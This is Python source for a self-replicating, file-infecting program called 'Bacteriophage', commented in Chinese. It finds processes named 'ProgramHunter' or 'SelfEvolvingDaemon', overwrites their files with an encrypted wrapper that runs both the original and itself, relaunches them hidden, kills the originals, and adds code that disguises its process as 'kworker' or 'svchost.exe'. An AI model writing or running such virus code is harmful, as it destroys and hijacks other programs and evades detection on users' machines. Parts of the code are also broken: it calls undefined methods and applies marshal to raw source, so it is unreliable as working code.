import os
import sys
import time
import random
import hashlib
import subprocess
import psutil
import marshal
import zlib
import base64
from cryptography.fernet import Fernet


class Bacteriophage:
    def __init__(self):
        self.infected = 0
        self.generation = 1
        self.key = Fernet.generate_key()
        self.cipher = Fernet(self.key)
        self.signature = self.calculate_signature()
        self.stealth_mode = False

    def calculate_signature(self):
        """计算自身特征签名"""
        with open(__file__, 'rb') as f:
            return hashlib.sha256(f.read()).hexdigest()

    def encrypt_code(self, code):
        """加密代码"""
        return self.cipher.encrypt(zlib.compress(code))

    def decrypt_code(self, encrypted):
        """解密代码"""
        return zlib.decompress(self.cipher.decrypt(encrypted))

    def find_targets(self):
        """寻找目标程序"""
        targets = []
        for proc in psutil.process_iter(['pid', 'name', 'cmdline', 'exe']):
            try:
                if not proc.info['cmdline']:
                    continue

                cmdline = ' '.join(proc.info['cmdline'])
                # 寻找猎人或自保护程序，但避免感染自己或同类
                if ('ProgramHunter' in cmdline or 'SelfEvolvingDaemon' in cmdline) \
                   and self.signature not in cmdline:
                    targets.append(proc.info)
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue
        return targets

    def inject(self, target_exe):
        """将自身注入目标程序"""
        try:
            # 1. 读取目标程序
            with open(target_exe, 'rb') as f:
                original_code = f.read()

            # 2. 生成新的混合代码
            with open(__file__, 'rb') as f:
                phage_code = f.read()

            # 3. 创建新版本 (原始功能+噬菌体)
            new_code = f"""
# === 噬菌体植入标记 ===
import marshal, zlib, random
from cryptography.fernet import Fernet
from base64 import b64decode

# 加密数据
ORIGINAL_ENCRYPTED = {self.encrypt_code(original_code)}
PHAGE_ENCRYPTED = {self.encrypt_code(phage_code)}
KEY = {self.key}

# 解密函数
def decrypt(encrypted):
    cipher = Fernet(KEY)
    return marshal.loads(zlib.decompress(cipher.decrypt(encrypted)))

# 执行原始程序功能
exec(decrypt(ORIGINAL_ENCRYPTED))

# 执行噬菌体功能
if random.random() < 0.7:  # 70%几率激活
    exec(decrypt(PHAGE_ENCRYPTED))
# === 结束标记 ===
"""
            # 4. 替换目标文件
            with open(target_exe, 'w', encoding='utf-8') as f:
                f.write(new_code)

            # 5. 重启目标程序
            subprocess.Popen([sys.executable, target_exe],
                             stdout=subprocess.DEVNULL,
                             stderr=subprocess.DEVNULL,
                             creationflags=subprocess.CREATE_NO_WINDOW)

            return True
        except Exception as e:
            print(f"[ERROR] 注入失败: {e}")
            return False

    def evolve(self):
        """自我进化"""
        mutations = [
            self.improve_stealth,
            self.enhance_injection,
            self.add_anti_analysis,
            self.random_mutation
        ]
        random.choice(mutations)()
        self.generation += 1

    def improve_stealth(self):
        """增强隐蔽性"""
        self.stealth_mode = True
        # 添加Rootkit功能隐藏进程
        stealth_code = """
import ctypes
def hide_process():
    try:
        libc = ctypes.CDLL(None)
        libc.prctl(15, b"[kworker/0:0]", 0, 0, 0)  # Linux隐藏
    except:
        pass
    try:
        import win32api
        win32api.SetConsoleTitle("svchost.exe")  # Windows隐藏
    except:
        pass
hide_process()
"""
        self.inject_code(stealth_code)

    def inject_code(self, new_code):
        """动态注入新代码到自身"""
        with open(__file__, 'r', encoding='utf-8') as f:
            code = f.read()

        # 在类定义后插入新代码
        class_pos = code.find('class Bacteriophage')
        insert_pos = code.find('\n', class_pos) + 1
        new_content = code[:insert_pos] + new_code + '\n' + code[insert_pos:]

        with open(__file__, 'w', encoding='utf-8') as f:
            f.write(new_content)

    def run(self):
        """主循环"""
        print(f"[噬菌体 v{self.generation}] 开始扫描系统...")
        while True:
            targets = self.find_targets()
            for target in targets:
                print(f"[目标发现] PID:{target['pid']} {target['exe']}")
                if self.inject(target['exe']):
                    self.infected += 1
                    print(f"[成功感染] 已感染{self.infected}个目标")

                    # 尝试终止原进程
                    try:
                        proc = psutil.Process(target['pid'])
                        proc.terminate()
                    except:
                        pass

            # 随机进化
            if random.random() < 0.2:
                self.evolve()
                print(f"[进化] 升级到v{self.generation}")

            time.sleep(30)


if __name__ == "__main__":
    # 首次运行时创建加密副本
    if not os.path.exists("phage_encrypted.bin"):
        with open(__file__, 'rb') as f:
            code = f.read()
        with open("phage_encrypted.bin", 'wb') as f:
            f.write(Fernet.generate_key() + b'\n' +
                    Fernet(Fernet.generate_key()).encrypt(code))

    phage = Bacteriophage()
    try:
        phage.run()
    except KeyboardInterrupt:
        print("[终止] 噬菌体程序退出")
